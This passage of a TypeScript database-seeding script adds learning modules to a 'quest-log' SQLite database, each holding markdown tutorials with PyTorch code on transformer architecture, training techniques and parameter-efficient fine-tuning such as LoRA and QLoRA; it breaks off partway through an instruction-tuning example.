import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);
const now = Date.now();

function addTasksToModule(moduleId: number, tasks: [string, string, string][]) {
	const existing = db.prepare('SELECT MAX(order_index) as max FROM tasks WHERE module_id = ?').get(moduleId) as { max: number };
	let idx = (existing.max || 0) + 1;
	tasks.forEach(([title, desc, details]) => {
		insertTask.run(moduleId, title, desc, details, idx++, now);
	});
}

function getOrCreateModule(pathId: number, name: string, desc: string, orderIdx: number): number {
	const existing = db.prepare('SELECT id FROM modules WHERE path_id = ? AND name = ?').get(pathId, name) as { id: number } | undefined;
	if (existing) return existing.id;
	const result = insertModule.run(pathId, name, desc, orderIdx, now);
	return Number(result.lastInsertRowid);
}

// Find paths with schedules that have more content than tasks
const paths = db.prepare(`
  SELECT p.id, p.name, p.schedule,
    (SELECT COUNT(*) FROM modules m JOIN tasks t ON t.module_id = m.id WHERE m.path_id = p.id) as task_count
  FROM paths p
  WHERE p.schedule IS NOT NULL AND p.schedule != ''
`).all() as { id: number; name: string; schedule: string; task_count: number }[];

console.log('Checking paths for schedule/task mismatch...');

let expanded = 0;

paths.forEach((p) => {
	const schedule = p.schedule || '';
	const weeks = (schedule.match(/week\s*\d+/gi) || []).length;
	const bullets = (schedule.match(/^\s*[-•*]/gm) || []).length;
	const lines = schedule.split('\n').filter((l) => l.trim().length > 5).length;

	const scheduleItems = Math.max(weeks * 3, bullets, Math.floor(lines / 2));
	const ratio = scheduleItems > 0 ? p.task_count / scheduleItems : 1;

	// If tasks are less than 50% of schedule items and schedule is substantial
	if (ratio < 0.5 && scheduleItems > 15) {
		console.log(`\nExpanding: ${p.name} (${p.task_count} tasks vs ~${scheduleItems} schedule items)`);
		expanded++;

		// Add tasks based on path name patterns
		if (p.name.includes('Transformer') || p.name.includes('LLM') || p.name.includes('Deep Learning')) {
			let modId = getOrCreateModule(p.id, 'Advanced Architecture', 'Deep dive into model architecture', 20);
			addTasksToModule(modId, [
				['Implement multi-head attention', 'Split Q, K, V into h heads (e.g., 8 or 12), compute attention in parallel, concatenate outputs. Each head learns different relationships. Example: head 1 focuses on syntax, head 2 on semantics.',
`## Multi-Head Attention

### Core Concept
\`\`\`
Instead of single attention:
  Attention(Q, K, V)

Use multiple heads in parallel:
  head_i = Attention(QW_i^Q, KW_i^K, VW_i^V)
  MultiHead = Concat(head_1, ..., head_h)W^O
\`\`\`

### Implementation
\`\`\`python
class MultiHeadAttention(nn.Module):
    def __init__(self, d_model, num_heads):
        super().__init__()
        self.d_model = d_model
        self.num_heads = num_heads
        self.d_k = d_model // num_heads

        self.W_q = nn.Linear(d_model, d_model)
        self.W_k = nn.Linear(d_model, d_model)
        self.W_v = nn.Linear(d_model, d_model)
        self.W_o = nn.Linear(d_model, d_model)

    def forward(self, q, k, v, mask=None):
        batch_size = q.size(0)

        # Linear projections and reshape to (batch, heads, seq, d_k)
        q = self.W_q(q).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        k = self.W_k(k).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        v = self.W_v(v).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)

        # Scaled dot-product attention
        scores = torch.matmul(q, k.transpose(-2, -1)) / math.sqrt(self.d_k)
        if mask is not None:
            scores = scores.masked_fill(mask == 0, -1e9)
        attn = F.softmax(scores, dim=-1)
        context = torch.matmul(attn, v)

        # Concatenate heads and project
        context = context.transpose(1, 2).contiguous().view(batch_size, -1, self.d_model)
        return self.W_o(context)
\`\`\`

### What Each Head Learns
\`\`\`
Different heads specialize in different patterns:
- Head 1: Subject-verb agreement
- Head 2: Coreference resolution
- Head 3: Positional patterns
- Head 4: Syntactic dependencies
\`\`\`

## Completion Criteria
- [ ] Implement multi-head splitting
- [ ] Parallel attention computation
- [ ] Concatenate and project outputs
- [ ] Verify with attention visualization`],

				['Build positional encoding', 'Add position information since attention is permutation-invariant. Sinusoidal: PE(pos,2i) = sin(pos/10000^(2i/d)). Or learned embeddings. RoPE for modern models.',
`## Positional Encoding

### Why Needed
\`\`\`
Attention is permutation-invariant:
  Attention("cat sat") = Attention("sat cat")

Need to inject position information so model
knows word order.
\`\`\`

### Sinusoidal Encoding (Original)
\`\`\`python
class SinusoidalPositionalEncoding(nn.Module):
    def __init__(self, d_model, max_len=5000):
        super().__init__()
        pe = torch.zeros(max_len, d_model)
        position = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1)
        div_term = torch.exp(torch.arange(0, d_model, 2).float() * (-math.log(10000.0) / d_model))

        pe[:, 0::2] = torch.sin(position * div_term)  # Even indices
        pe[:, 1::2] = torch.cos(position * div_term)  # Odd indices

        pe = pe.unsqueeze(0)  # Add batch dimension
        self.register_buffer('pe', pe)

    def forward(self, x):
        return x + self.pe[:, :x.size(1)]
\`\`\`

### Learned Positional Embeddings
\`\`\`python
class LearnedPositionalEncoding(nn.Module):
    def __init__(self, d_model, max_len=512):
        super().__init__()
        self.pos_embedding = nn.Embedding(max_len, d_model)

    def forward(self, x):
        seq_len = x.size(1)
        positions = torch.arange(seq_len, device=x.device)
        return x + self.pos_embedding(positions)
\`\`\`

### RoPE (Rotary Position Embedding)
\`\`\`python
def apply_rotary_emb(x, freqs):
    # Split into pairs and rotate
    x1, x2 = x[..., ::2], x[..., 1::2]
    cos, sin = freqs.cos(), freqs.sin()
    return torch.cat([x1 * cos - x2 * sin, x1 * sin + x2 * cos], dim=-1)

# RoPE encodes relative positions directly in attention
# No explicit position embedding added to input
\`\`\`

## Completion Criteria
- [ ] Implement sinusoidal encoding
- [ ] Test with learned embeddings
- [ ] Understand RoPE advantages
- [ ] Verify position information preserved`],

				['Add layer normalization', 'Normalize activations across features. Pre-LN (before attention/FFN) is more stable for training. Post-LN (after residual) was original design. LayerNorm(x) = (x - μ) / σ * γ + β.',
`## Layer Normalization

### Formula
\`\`\`
LayerNorm(x) = γ * (x - μ) / √(σ² + ε) + β

Where:
- μ = mean across feature dimension
- σ² = variance across feature dimension
- γ, β = learnable scale and shift parameters
- ε = small constant for numerical stability
\`\`\`

### Implementation
\`\`\`python
class LayerNorm(nn.Module):
    def __init__(self, d_model, eps=1e-6):
        super().__init__()
        self.gamma = nn.Parameter(torch.ones(d_model))
        self.beta = nn.Parameter(torch.zeros(d_model))
        self.eps = eps

    def forward(self, x):
        mean = x.mean(dim=-1, keepdim=True)
        std = x.std(dim=-1, keepdim=True)
        return self.gamma * (x - mean) / (std + self.eps) + self.beta
\`\`\`

### Pre-LN vs Post-LN
\`\`\`python
# Post-LN (original transformer)
# Gradients can explode/vanish in deep networks
x = x + self.attention(x)
x = self.norm1(x)
x = x + self.ffn(x)
x = self.norm2(x)

# Pre-LN (more stable, used in GPT-2+)
# Better gradient flow
x = x + self.attention(self.norm1(x))
x = x + self.ffn(self.norm2(x))
\`\`\`

### RMSNorm (Simplified)
\`\`\`python
class RMSNorm(nn.Module):
    def __init__(self, d_model, eps=1e-6):
        super().__init__()
        self.weight = nn.Parameter(torch.ones(d_model))
        self.eps = eps

    def forward(self, x):
        rms = torch.sqrt(torch.mean(x ** 2, dim=-1, keepdim=True) + self.eps)
        return self.weight * x / rms

# Used in LLaMA - no mean subtraction, no bias
# Slightly faster, similar performance
\`\`\`

## Completion Criteria
- [ ] Implement LayerNorm from scratch
- [ ] Compare Pre-LN vs Post-LN training
- [ ] Test RMSNorm variant
- [ ] Verify normalization statistics`],

				['Implement feed-forward network', 'Two-layer MLP after attention: FFN(x) = GELU(xW₁)W₂. Hidden dim typically 4x model dim (e.g., 768 → 3072 → 768). Processes each position independently.',
`## Feed-Forward Network

### Architecture
\`\`\`
Position-wise FFN processes each token independently:

Input (batch, seq, d_model)
    ↓
Linear (d_model → d_ff)  # Typically d_ff = 4 * d_model
    ↓
Activation (GELU/ReLU/SiLU)
    ↓
Linear (d_ff → d_model)
    ↓
Output (batch, seq, d_model)
\`\`\`

### Implementation
\`\`\`python
class FeedForward(nn.Module):
    def __init__(self, d_model, d_ff=None, dropout=0.1):
        super().__init__()
        d_ff = d_ff or 4 * d_model
        self.linear1 = nn.Linear(d_model, d_ff)
        self.linear2 = nn.Linear(d_ff, d_model)
        self.dropout = nn.Dropout(dropout)

    def forward(self, x):
        return self.linear2(self.dropout(F.gelu(self.linear1(x))))
\`\`\`

### Activation Functions
\`\`\`python
# ReLU (original)
F.relu(x)

# GELU (GPT-2, BERT) - smooth approximation
def gelu(x):
    return 0.5 * x * (1 + torch.tanh(math.sqrt(2/math.pi) * (x + 0.044715 * x**3)))

# SiLU/Swish (LLaMA, modern models)
F.silu(x)  # x * sigmoid(x)
\`\`\`

### GLU Variants (LLaMA, PaLM)
\`\`\`python
class SwiGLU(nn.Module):
    def __init__(self, d_model, d_ff):
        super().__init__()
        self.w1 = nn.Linear(d_model, d_ff, bias=False)
        self.w2 = nn.Linear(d_ff, d_model, bias=False)
        self.w3 = nn.Linear(d_model, d_ff, bias=False)

    def forward(self, x):
        # Gated: element-wise multiply with gate
        return self.w2(F.silu(self.w1(x)) * self.w3(x))

# More parameters but better performance
\`\`\`

## Completion Criteria
- [ ] Implement basic FFN
- [ ] Test different activations
- [ ] Implement SwiGLU variant
- [ ] Profile memory usage`],

				['Build residual connections', 'Add input to output of each sublayer: x + Sublayer(x). Enables gradient flow through deep networks. Essential for training 100+ layer transformers.',
`## Residual Connections

### Concept
\`\`\`
Skip connection adds input to sublayer output:
  output = x + Sublayer(x)

Enables gradient to flow directly through:
  ∂L/∂x = ∂L/∂output * (1 + ∂Sublayer/∂x)

The "1" term ensures gradients never vanish completely.
\`\`\`

### In Transformer Block
\`\`\`python
class TransformerBlock(nn.Module):
    def __init__(self, d_model, num_heads, d_ff, dropout=0.1):
        super().__init__()
        self.attention = MultiHeadAttention(d_model, num_heads)
        self.ffn = FeedForward(d_model, d_ff)
        self.norm1 = nn.LayerNorm(d_model)
        self.norm2 = nn.LayerNorm(d_model)
        self.dropout = nn.Dropout(dropout)

    def forward(self, x, mask=None):
        # Residual around attention (Pre-LN)
        x = x + self.dropout(self.attention(self.norm1(x), mask=mask))

        # Residual around FFN
        x = x + self.dropout(self.ffn(self.norm2(x)))

        return x
\`\`\`

### Gradient Flow Visualization
\`\`\`
Without residuals (100 layers):
  gradient = (small_value)^100 → vanishes

With residuals:
  gradient = Σ paths through network
  Always includes direct path with gradient = 1
\`\`\`

### Scaling for Deep Networks
\`\`\`python
# For very deep networks, scale residual
class DeepResidual(nn.Module):
    def __init__(self, layer, depth):
        self.layer = layer
        # Scale factor decreases with depth
        self.scale = 1.0 / math.sqrt(2 * depth)

    def forward(self, x):
        return x + self.scale * self.layer(x)
\`\`\`

## Completion Criteria
- [ ] Implement residual connections
- [ ] Train with/without to compare
- [ ] Visualize gradient magnitudes
- [ ] Test with deep (24+ layer) model`],
			]);
			modId = getOrCreateModule(p.id, 'Training Techniques', 'Modern training methods', 21);
			addTasksToModule(modId, [
				['Implement gradient accumulation', 'Accumulate gradients over N mini-batches before optimizer step. Simulates batch_size * N with less memory. Example: 4 steps of batch=8 equals batch=32.',
`## Gradient Accumulation

### Why Use It
\`\`\`
Problem: Large batch sizes improve training but don't fit in GPU memory
Solution: Accumulate gradients over multiple forward passes before updating

Effective batch size = micro_batch_size × accumulation_steps
Example: 4 × 8 = 32 effective batch size
\`\`\`

### Implementation
\`\`\`python
accumulation_steps = 4
optimizer.zero_grad()

for i, batch in enumerate(dataloader):
    inputs, labels = batch
    outputs = model(inputs)
    loss = criterion(outputs, labels)

    # Scale loss by accumulation steps
    loss = loss / accumulation_steps
    loss.backward()

    # Only update weights after accumulation_steps
    if (i + 1) % accumulation_steps == 0:
        optimizer.step()
        optimizer.zero_grad()
\`\`\`

### With Mixed Precision
\`\`\`python
scaler = torch.cuda.amp.GradScaler()
accumulation_steps = 4

for i, batch in enumerate(dataloader):
    with torch.cuda.amp.autocast():
        outputs = model(batch['input_ids'])
        loss = criterion(outputs, batch['labels']) / accumulation_steps

    scaler.scale(loss).backward()

    if (i + 1) % accumulation_steps == 0:
        scaler.step(optimizer)
        scaler.update()
        optimizer.zero_grad()
\`\`\`

### Considerations
\`\`\`
- Batch normalization: statistics differ with smaller micro-batches
- Learning rate: may need to scale with effective batch size
- Gradient sync: in distributed training, sync only at accumulation boundary
\`\`\`

## Completion Criteria
- [ ] Implement gradient accumulation
- [ ] Verify effective batch size matches
- [ ] Test with mixed precision
- [ ] Compare training curves`],

				['Add learning rate warmup', 'Start with small LR, linearly increase to target over warmup steps (e.g., 2000 steps). Prevents early instability. Then decay (cosine, linear, or constant).',
`## Learning Rate Scheduling

### Warmup Phase
\`\`\`python
def get_lr(step, warmup_steps, max_lr):
    if step < warmup_steps:
        # Linear warmup
        return max_lr * step / warmup_steps
    return max_lr

# Why warmup?
# - Early gradients are noisy (random initialization)
# - Large LR + noisy gradients = instability
# - Warmup allows model to find reasonable region first
\`\`\`

### Cosine Annealing
\`\`\`python
def cosine_schedule(step, warmup_steps, total_steps, max_lr, min_lr=0):
    if step < warmup_steps:
        return max_lr * step / warmup_steps
    else:
        progress = (step - warmup_steps) / (total_steps - warmup_steps)
        return min_lr + 0.5 * (max_lr - min_lr) * (1 + math.cos(math.pi * progress))
\`\`\`

### Using PyTorch Schedulers
\`\`\`python
from torch.optim.lr_scheduler import LambdaLR, CosineAnnealingLR

# Linear warmup then cosine decay
def lr_lambda(step):
    if step < warmup_steps:
        return step / warmup_steps
    progress = (step - warmup_steps) / (total_steps - warmup_steps)
    return 0.5 * (1 + math.cos(math.pi * progress))

scheduler = LambdaLR(optimizer, lr_lambda)

# Training loop
for batch in dataloader:
    loss = train_step(batch)
    optimizer.step()
    scheduler.step()
\`\`\`

### Common Schedules
\`\`\`
1. Constant with warmup
2. Linear decay
3. Cosine annealing (most common for LLMs)
4. Cosine with restarts
5. Inverse square root (original Transformer)
\`\`\`

## Completion Criteria
- [ ] Implement warmup
- [ ] Add cosine decay
- [ ] Visualize LR schedule
- [ ] Compare training stability`],

				['Build mixed precision training', 'Use FP16/BF16 for forward/backward pass, FP32 for optimizer. 2x memory savings, faster compute on modern GPUs. torch.cuda.amp.autocast() context manager.',
`## Mixed Precision Training

### Why Mixed Precision
\`\`\`
FP32: 4 bytes per parameter
FP16: 2 bytes per parameter (half memory!)

Benefits:
- 2x memory savings for activations
- Faster matrix multiply on tensor cores
- Larger batch sizes possible

Risks:
- FP16 has limited range (can overflow/underflow)
- Need loss scaling to prevent gradient underflow
\`\`\`

### PyTorch AMP
\`\`\`python
from torch.cuda.amp import autocast, GradScaler

model = Model().cuda()
optimizer = torch.optim.AdamW(model.parameters())
scaler = GradScaler()

for batch in dataloader:
    optimizer.zero_grad()

    # Forward pass in FP16
    with autocast():
        outputs = model(batch['input_ids'])
        loss = criterion(outputs, batch['labels'])

    # Backward pass: scale loss to prevent underflow
    scaler.scale(loss).backward()

    # Unscale gradients, clip, then step
    scaler.unscale_(optimizer)
    torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)
    scaler.step(optimizer)
    scaler.update()
\`\`\`

### BF16 (Brain Float 16)
\`\`\`python
# BF16 has same range as FP32, just less precision
# No need for loss scaling!
# Requires Ampere or newer GPU (A100, 3090, 4090)

with autocast(dtype=torch.bfloat16):
    outputs = model(inputs)
    loss = criterion(outputs, labels)

loss.backward()
optimizer.step()  # No scaler needed
\`\`\`

### What Stays in FP32
\`\`\`
Keep in FP32 for stability:
- Loss computation
- Softmax (numerical issues)
- Layer norm (small values)
- Optimizer state (momentum, variance)
\`\`\`

## Completion Criteria
- [ ] Implement AMP training
- [ ] Measure memory savings
- [ ] Compare training speed
- [ ] Test BF16 if available`],

				['Implement gradient clipping', 'Clip gradient norm to max value (e.g., 1.0) to prevent exploding gradients. torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0).',
`## Gradient Clipping

### Why Clip Gradients
\`\`\`
Exploding gradients cause:
- NaN losses
- Training instability
- Divergence

Common in:
- RNNs/LSTMs (long sequences)
- Deep transformers
- Early training with large LR
\`\`\`

### Norm Clipping (Most Common)
\`\`\`python
# Clip total gradient norm
max_norm = 1.0
torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm)

# How it works:
# 1. Compute total norm: sqrt(sum(grad**2 for all params))
# 2. If norm > max_norm: scale all gradients by (max_norm / norm)
# 3. This preserves gradient direction, just limits magnitude
\`\`\`

### Implementation from Scratch
\`\`\`python
def clip_grad_norm_(parameters, max_norm):
    parameters = list(filter(lambda p: p.grad is not None, parameters))

    # Compute total norm
    total_norm = 0.0
    for p in parameters:
        total_norm += p.grad.data.norm(2).item() ** 2
    total_norm = total_norm ** 0.5

    # Scale if needed
    clip_coef = max_norm / (total_norm + 1e-6)
    if clip_coef < 1:
        for p in parameters:
            p.grad.data.mul_(clip_coef)

    return total_norm
\`\`\`

### Value Clipping (Alternative)
\`\`\`python
# Clip each gradient element independently
torch.nn.utils.clip_grad_value_(model.parameters(), clip_value=1.0)

# Less common, can distort gradient direction
\`\`\`

### Monitoring Gradients
\`\`\`python
# Log gradient norms to detect issues
total_norm = torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm)
if total_norm > max_norm:
    print(f"Clipped gradient from {total_norm:.2f} to {max_norm}")
\`\`\`

## Completion Criteria
- [ ] Implement gradient clipping
- [ ] Monitor gradient norms during training
- [ ] Test effect on training stability
- [ ] Find optimal max_norm value`],

				['Add checkpoint saving', 'Save model state_dict, optimizer state, epoch, step periodically. Enable resume from failures. Save best model based on validation loss.',
`## Checkpoint Management

### What to Save
\`\`\`python
checkpoint = {
    'epoch': epoch,
    'global_step': global_step,
    'model_state_dict': model.state_dict(),
    'optimizer_state_dict': optimizer.state_dict(),
    'scheduler_state_dict': scheduler.state_dict(),
    'loss': loss,
    'config': config,
    'rng_state': torch.get_rng_state(),
    'cuda_rng_state': torch.cuda.get_rng_state(),
}
torch.save(checkpoint, f'checkpoint_epoch_{epoch}.pt')
\`\`\`

### Resume Training
\`\`\`python
def load_checkpoint(path, model, optimizer, scheduler):
    checkpoint = torch.load(path)

    model.load_state_dict(checkpoint['model_state_dict'])
    optimizer.load_state_dict(checkpoint['optimizer_state_dict'])
    scheduler.load_state_dict(checkpoint['scheduler_state_dict'])

    # Restore RNG state for reproducibility
    torch.set_rng_state(checkpoint['rng_state'])
    torch.cuda.set_rng_state(checkpoint['cuda_rng_state'])

    return checkpoint['epoch'], checkpoint['global_step']

# Resume
start_epoch, global_step = load_checkpoint('checkpoint.pt', model, optimizer, scheduler)
\`\`\`

### Save Best Model
\`\`\`python
best_val_loss = float('inf')

for epoch in range(num_epochs):
    train_loss = train_epoch(model, train_loader)
    val_loss = validate(model, val_loader)

    # Save checkpoint periodically
    if epoch % save_every == 0:
        save_checkpoint(f'checkpoint_epoch_{epoch}.pt')

    # Save best model
    if val_loss < best_val_loss:
        best_val_loss = val_loss
        save_checkpoint('best_model.pt')
        print(f"New best model! Val loss: {val_loss:.4f}")
\`\`\`

### Checkpoint Rotation
\`\`\`python
import os
from pathlib import Path

def save_with_rotation(checkpoint, path, keep_last=3):
    # Save new checkpoint
    torch.save(checkpoint, path)

    # Remove old checkpoints
    checkpoint_dir = Path(path).parent
    checkpoints = sorted(checkpoint_dir.glob('checkpoint_*.pt'))
    for old_ckpt in checkpoints[:-keep_last]:
        old_ckpt.unlink()
\`\`\`

## Completion Criteria
- [ ] Save complete training state
- [ ] Resume training from checkpoint
- [ ] Track and save best model
- [ ] Implement checkpoint rotation`],
			]);
			modId = getOrCreateModule(p.id, 'Fine-tuning Methods', 'Adaptation techniques', 22);
			addTasksToModule(modId, [
				['Implement LoRA', 'Low-Rank Adaptation: freeze base model, add trainable low-rank matrices A (d×r) and B (r×d) where r<<d (e.g., 8). W\' = W + BA. 100x fewer trainable parameters.',
`## LoRA (Low-Rank Adaptation)

### Core Concept
\`\`\`
Original: Y = XW (W is d×d, millions of params)
LoRA: Y = X(W + BA) where B is d×r, A is r×d

With r=8 and d=4096:
- Full: 4096 × 4096 = 16M params
- LoRA: 4096 × 8 + 8 × 4096 = 65K params (0.4%)
\`\`\`

### Implementation
\`\`\`python
class LoRALayer(nn.Module):
    def __init__(self, original_layer, r=8, alpha=16):
        super().__init__()
        self.original = original_layer
        self.original.requires_grad_(False)  # Freeze

        d_in = original_layer.in_features
        d_out = original_layer.out_features

        # Low-rank matrices
        self.A = nn.Parameter(torch.randn(d_in, r) / r)
        self.B = nn.Parameter(torch.zeros(r, d_out))

        self.scaling = alpha / r

    def forward(self, x):
        original_out = self.original(x)
        lora_out = (x @ self.A @ self.B) * self.scaling
        return original_out + lora_out
\`\`\`

### Apply to Model
\`\`\`python
def add_lora_to_model(model, r=8, alpha=16, target_modules=['q_proj', 'v_proj']):
    for name, module in model.named_modules():
        if any(target in name for target in target_modules):
            parent = get_parent_module(model, name)
            setattr(parent, name.split('.')[-1], LoRALayer(module, r, alpha))

# Using PEFT library
from peft import LoraConfig, get_peft_model

config = LoraConfig(
    r=8,
    lora_alpha=16,
    target_modules=["q_proj", "v_proj"],
    lora_dropout=0.05,
)
model = get_peft_model(model, config)
model.print_trainable_parameters()  # ~0.1% of total
\`\`\`

### Merge for Inference
\`\`\`python
# After training, merge LoRA into base weights
def merge_lora(model):
    for name, module in model.named_modules():
        if isinstance(module, LoRALayer):
            merged_weight = module.original.weight + (module.A @ module.B).T * module.scaling
            module.original.weight.data = merged_weight

# Or with PEFT
model = model.merge_and_unload()
\`\`\`

## Completion Criteria
- [ ] Implement LoRA layer
- [ ] Apply to attention projections
- [ ] Train and evaluate
- [ ] Merge weights for inference`],

				['Build QLoRA', 'Quantize base model to 4-bit NormalFloat, apply LoRA adapters in FP16. Enables fine-tuning 65B models on single GPU. Uses double quantization for memory efficiency.',
`## QLoRA (Quantized LoRA)

### Key Innovations
\`\`\`
1. 4-bit NormalFloat (NF4): Quantization optimal for normally-distributed weights
2. Double Quantization: Quantize the quantization constants
3. Paged Optimizers: Handle memory spikes with CPU offload

Memory: 65B model in ~40GB VRAM (vs 130GB+ for FP16)
\`\`\`

### Setup with bitsandbytes
\`\`\`python
import torch
from transformers import AutoModelForCausalLM, BitsAndBytesConfig
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training

# 4-bit quantization config
bnb_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_use_double_quant=True,
    bnb_4bit_quant_type="nf4",
    bnb_4bit_compute_dtype=torch.bfloat16
)

# Load quantized model
model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-2-7b-hf",
    quantization_config=bnb_config,
    device_map="auto"
)

# Prepare for training
model = prepare_model_for_kbit_training(model)
\`\`\`

### Add LoRA
\`\`\`python
lora_config = LoraConfig(
    r=64,
    lora_alpha=16,
    target_modules=[
        "q_proj", "k_proj", "v_proj", "o_proj",
        "gate_proj", "up_proj", "down_proj"
    ],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)

model = get_peft_model(model, lora_config)
\`\`\`

### Training
\`\`\`python
from transformers import TrainingArguments, Trainer

training_args = TrainingArguments(
    output_dir="./results",
    per_device_train_batch_size=4,
    gradient_accumulation_steps=4,
    learning_rate=2e-4,
    fp16=True,
    logging_steps=10,
    num_train_epochs=3,
    optim="paged_adamw_8bit",  # Memory-efficient optimizer
)

trainer = Trainer(
    model=model,
    train_dataset=dataset,
    args=training_args,
)
trainer.train()
\`\`\`

### Memory Comparison
\`\`\`
LLaMA-7B:
- Full FP16: ~14GB
- QLoRA 4-bit: ~4GB + ~1GB LoRA = ~5GB

LLaMA-65B:
- Full FP16: ~130GB (impossible on consumer GPU)
- QLoRA 4-bit: ~35GB (fits on A100 40GB!)
\`\`\`

## Completion Criteria
- [ ] Load model in 4-bit
- [ ] Apply LoRA adapters
- [ ] Train with QLoRA
- [ ] Compare quality vs full fine-tune`],

				['Add prompt tuning', 'Prepend learnable soft prompt embeddings (e.g., 20 virtual tokens) to input. Only train prompt parameters, freeze model. Task-specific prompts for multi-task.',
`## Prompt Tuning

### Concept
\`\`\`
Instead of: "Translate to French: Hello"
Use: [P1][P2]...[P20] Hello

Where [P1]...[P20] are learnable embedding vectors.
Model is frozen; only prompt embeddings are trained.
\`\`\`

### Implementation
\`\`\`python
class SoftPrompt(nn.Module):
    def __init__(self, num_tokens, embedding_dim, init_from_vocab=None):
        super().__init__()

        if init_from_vocab is not None:
            # Initialize from existing embeddings
            self.prompt = nn.Parameter(init_from_vocab[:num_tokens].clone())
        else:
            # Random initialization
            self.prompt = nn.Parameter(torch.randn(num_tokens, embedding_dim))

    def forward(self, input_embeddings):
        # Prepend soft prompt to input
        batch_size = input_embeddings.size(0)
        prompt_expanded = self.prompt.unsqueeze(0).expand(batch_size, -1, -1)
        return torch.cat([prompt_expanded, input_embeddings], dim=1)

# Usage
soft_prompt = SoftPrompt(num_tokens=20, embedding_dim=768)
input_embeds = model.get_input_embeddings()(input_ids)
prompted_embeds = soft_prompt(input_embeds)
outputs = model(inputs_embeds=prompted_embeds)
\`\`\`

### Using PEFT Library
\`\`\`python
from peft import PromptTuningConfig, get_peft_model, PromptTuningInit

config = PromptTuningConfig(
    task_type="CAUSAL_LM",
    num_virtual_tokens=20,
    prompt_tuning_init=PromptTuningInit.TEXT,
    prompt_tuning_init_text="Classify the sentiment of this text:",
    tokenizer_name_or_path="gpt2",
)

model = get_peft_model(base_model, config)
# Only ~20K trainable parameters!
\`\`\`

### Multi-Task with Prompts
\`\`\`python
# Different prompt for each task
prompts = {
    'sentiment': SoftPrompt(20, 768),
    'translation': SoftPrompt(20, 768),
    'summarization': SoftPrompt(20, 768),
}

def forward(task, input_ids):
    embeds = model.get_input_embeddings()(input_ids)
    prompted = prompts[task](embeds)
    return model(inputs_embeds=prompted)
\`\`\`

### Comparison
\`\`\`
Method          | Trainable Params | Performance
----------------|------------------|------------
Full Fine-tune  | 100%             | Best
LoRA            | 0.1-1%           | Very Good
Prompt Tuning   | 0.01%            | Good
\`\`\`

## Completion Criteria
- [ ] Implement soft prompt
- [ ] Prepend to model input
- [ ] Train prompt parameters
- [ ] Compare to other methods`],

				['Implement adapter layers', 'Insert small bottleneck layers (down-project → nonlinearity → up-project) between transformer layers. Train only adapters. ~3% additional parameters per task.',
`## Adapter Layers

### Architecture
\`\`\`
Original transformer block:
  Attention → Add & Norm → FFN → Add & Norm

With adapters:
  Attention → Add & Norm → [Adapter] → FFN → Add & Norm → [Adapter]

Adapter structure:
  Input (d) → Down (d→r) → ReLU → Up (r→d) → Output
  Plus residual: Output = Input + Adapter(Input)
\`\`\`

### Implementation
\`\`\`python
class Adapter(nn.Module):
    def __init__(self, d_model, bottleneck_dim=64):
        super().__init__()
        self.down_proj = nn.Linear(d_model, bottleneck_dim)
        self.up_proj = nn.Linear(bottleneck_dim, d_model)
        self.activation = nn.ReLU()

        # Initialize up_proj to near-zero for stable training
        nn.init.zeros_(self.up_proj.weight)
        nn.init.zeros_(self.up_proj.bias)

    def forward(self, x):
        residual = x
        x = self.down_proj(x)
        x = self.activation(x)
        x = self.up_proj(x)
        return residual + x


class AdaptedTransformerBlock(nn.Module):
    def __init__(self, original_block, bottleneck_dim=64):
        super().__init__()
        self.block = original_block
        # Freeze original
        for param in self.block.parameters():
            param.requires_grad = False

        d_model = original_block.attention.d_model
        self.adapter1 = Adapter(d_model, bottleneck_dim)
        self.adapter2 = Adapter(d_model, bottleneck_dim)

    def forward(self, x, mask=None):
        # Attention with adapter
        x = x + self.block.attention(self.block.norm1(x), mask=mask)
        x = self.adapter1(x)

        # FFN with adapter
        x = x + self.block.ffn(self.block.norm2(x))
        x = self.adapter2(x)

        return x
\`\`\`

### Using PEFT
\`\`\`python
from peft import AdapterConfig, get_peft_model

config = AdapterConfig(
    r=64,  # Bottleneck dimension
    target_modules=["attention", "mlp"],
    modules_to_save=["classifier"],
)

model = get_peft_model(base_model, config)
\`\`\`

### Parameter Efficiency
\`\`\`
12-layer transformer, d=768, bottleneck=64:
- Adapter params per layer: 2 × (768×64 + 64×768) ≈ 200K
- Total adapter params: 12 × 200K = 2.4M
- Base model: ~110M
- Overhead: ~2.2%
\`\`\`

## Completion Criteria
- [ ] Implement adapter module
- [ ] Insert into transformer blocks
- [ ] Train only adapter parameters
- [ ] Evaluate on downstream task`],

				['Build instruction tuning pipeline', 'Fine-tune on instruction-response pairs. Format: "### Instruction:\\n{task}\\n### Response:\\n{answer}". Teaches model to follow diverse instructions.',
`## Instruction Tuning

### Data Format
\`\`\`python
# Standard instruction format
template = """### Instruction:
{instruction}

### Input:
{input}

### Response:
{output}"""

# Example
{
    "instruction": "Summarize the following text.",
    "input": "The quick brown fox jumps over the lazy dog...",
    "output": "A fox jumps over a dog."
}
\`\`\`

### Dataset Preparation
\`\`\`python
def format_instruction(example):
    if example['input']:
        text = f"### Instruction:\\n{example['instruction']}\\n\\n### Input:\\n{example['input']}\\n\\n### Response:\\n{example['output']}"
    else:
        text = f"### Instruction:\\n{example['instruction']}\\n\\n### Response:\\n{example['output']}"
    return {"text": text}

# Load and format dataset
from datasets import load_dataset
dataset = load_dataset("databricks/dolly-15k")
dataset = dataset.map(format_instruction)
\`\`\`

### Training Setup
\`\`\`python
from transformers import Trainer, TrainingArguments, DataCollatorForLanguageModeling

# Only compute loss on response tokens
def compute_loss(model, inputs, return_outputs=False):
    labels = inputs.pop("labels")
    outputs = model(**inputs)

    # Mask instruction tokens (don't learn to predict them)
    response_start = find_response_start(inputs['input_ids'])
    labels[:, :response_start] = -100

